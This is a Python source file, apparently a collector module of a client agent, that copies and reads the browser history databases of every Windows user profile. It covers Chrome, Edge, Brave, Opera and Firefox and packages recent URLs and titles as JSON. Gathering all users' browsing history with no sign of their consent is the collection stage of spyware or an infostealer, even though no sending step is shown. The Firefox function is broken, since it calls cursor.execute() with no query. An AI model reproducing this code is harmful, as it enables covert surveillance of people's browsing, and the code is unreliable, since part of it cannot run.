# client/collectors/browser_history_collector.py
import os
import sqlite3
import shutil
import logging
import json
import tempfile
from datetime import datetime, timedelta
logger = logging.getLogger("client.browser_history_collector")
class BrowserHistoryCollector:
    def __init__(self):
        self.output_data = {}
        self.temp_files = []
    def collect_all_browsers_history(self):
        try:
            logger.info("Iniciando coleta de histórico de navegadores")
            self.output_data = {}
            usuarios = self._listar_usuarios()
            for user_path in usuarios:
                self._processar_usuario(user_path)
            self._limpar_arquivos_temporarios()
            logger.info(f"Coleta de histórico finalizada. Encontrados dados de {len(self.output_data)} perfis de navegador")
            return json.dumps(self.output_data, ensure_ascii=False)
        except Exception as e:
            logger.error(f"Erro ao coletar histórico de navegadores: {str(e)}")
            self._limpar_arquivos_temporarios()
            return json.dumps({"error": str(e)})
    def _listar_usuarios(self):
        base = "C:/Users"
        if not os.path.exists(base):
            logger.warning("Diretório de usuários não encontrado")
            return []
        return [os.path.join(base, u) for u in os.listdir(base) if os.path.isdir(os.path.join(base, u))]
    def _copiar_banco(self, origem):
        try:
            temp_file = tempfile.NamedTemporaryFile(delete=False, suffix='.sqlite')
            temp_file.close()
            temp_path = temp_file.name
            shutil.copy2(origem, temp_path)
            self.temp_files.append(temp_path)
            return temp_path
        except Exception as e:
            logger.error(f"Erro ao copiar banco de dados {origem}: {str(e)}")
            return None
    def _ler_chromium_history(self, banco):
        dados = []
        try:
            conn = sqlite3.connect(banco)
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 1000")
            for url, title, timestamp in cursor.fetchall():
                if title is None:
                    title = ""
                try:
                    data = datetime(1601, 1, 1) + timedelta(microseconds=timestamp)
                    dados.append({
                        "title": title,
                        "url": url,
                        "timestamp": data.strftime("%Y-%m-%d %H:%M:%S")
                    })
                except:
                    pass
            conn.close()
        except Exception as e:
            logger.error(f"Erro ao ler histórico Chromium de {banco}: {str(e)}")
        return dados
    def _ler_firefox_history(self, banco):
        dados = []
        try:
            temp = self._copiar_banco(banco)
            if not temp:
                return []
            conn = sqlite3.connect(temp)
            cursor = conn.cursor()
            cursor.execute()
            for url, title, timestamp in cursor.fetchall():
                if title is None:
                    title = ""
                try:
                    data = datetime(1970, 1, 1) + timedelta(microseconds=timestamp)
                    dados.append({
                        "title": title,
                        "url": url,
                        "timestamp": data.strftime("%Y-%m-%d %H:%M:%S")
                    })
                except:
                    pass
            conn.close()
        except Exception as e:
            logger.error(f"Erro ao ler histórico Firefox de {banco}: {str(e)}")
        return dados
    def _processar_usuario(self, user_path):
        try:
            user = os.path.basename(user_path)
            logger.info(f"Processando histórico para o usuário: {user}")
            base_paths = {
                "Chrome": os.path.join(user_path, "AppData", "Local", "Google", "Chrome", "User Data"),
                "Edge": os.path.join(user_path, "AppData", "Local", "Microsoft", "Edge", "User Data"),
                "Brave": os.path.join(user_path, "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
                "Opera": os.path.join(user_path, "AppData", "Roaming", "Opera Software", "Opera Stable"),
                "Opera GX": os.path.join(user_path, "AppData", "Roaming", "Opera Software", "Opera GX Stable"),
                "Firefox": os.path.join(user_path, "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
            }
            for navegador in ["Chrome", "Edge", "Brave"]:
                base_path = base_paths[navegador]
                if os.path.exists(base_path):
                    logger.info(f"Processando {navegador} para usuário {user}")
                    for perfil in os.listdir(base_path):
                        if perfil.startswith("Profile ") or perfil == "Default":
                            perfil_path = os.path.join(base_path, perfil)
                            hist_path = os.path.join(perfil_path, "History")
                            if os.path.exists(hist_path):
                                try:
                                    temp = self._copiar_banco(hist_path)
                                    if temp:
                                        dados = self._ler_chromium_history(temp)
                                        if dados:
                                            key = f"{user}|{navegador}|{perfil}"
                                            self.output_data[key] = dados
                                            logger.info(f"Adicionados {len(dados)} registros para {key}")
                                except Exception as e:
                                    logger.error(f"Erro ao processar {navegador} perfil {perfil}: {str(e)}")
            for navegador in ["Opera", "Opera GX"]:
                opera_path = base_paths[navegador]
                if os.path.exists(opera_path):
                    logger.info(f"Processando {navegador} para usuário {user}")
                    hist_path = os.path.join(opera_path, "History")
                    if os.path.exists(hist_path):
                        try:
                            temp = self._copiar_banco(hist_path)
                            if temp:
                                dados = self._ler_chromium_history(temp)
                                if dados:
                                    key = f"{user}|{navegador}|Default"
                                    self.output_data[key] = dados
                                    logger.info(f"Adicionados {len(dados)} registros para {key}")
                        except Exception as e:
                            logger.error(f"Erro ao processar {navegador}: {str(e)}")
            ff_profiles = base_paths["Firefox"]
            if os.path.exists(ff_profiles):
                logger.info(f"Processando Firefox para usuário {user}")
                for perfil in os.listdir(ff_profiles):
                    perfil_path = os.path.join(ff_profiles, perfil)
                    hist_path = os.path.join(perfil_path, "places.sqlite")
                    if os.path.exists(hist_path):
                        try:
                            dados = self._ler_firefox_history(hist_path)
                            if dados:
                                key = f"{user}|Firefox|{perfil}"
                                self.output_data[key] = dados
                                logger.info(f"Adicionados {len(dados)} registros para {key}")
                        except Exception as e:
                            logger.error(f"Erro ao processar Firefox perfil {perfil}: {str(e)}")
        except Exception as e:
            logger.error(f"Erro ao processar usuário {user_path}: {str(e)}")
    def _limpar_arquivos_temporarios(self):
        for temp_file in self.temp_files:
            try:
                if os.path.exists(temp_file):
                    os.remove(temp_file)
            except Exception as e:
                logger.error(f"Erro ao remover arquivo temporário {temp_file}: {str(e)}")
        self.temp_files = []
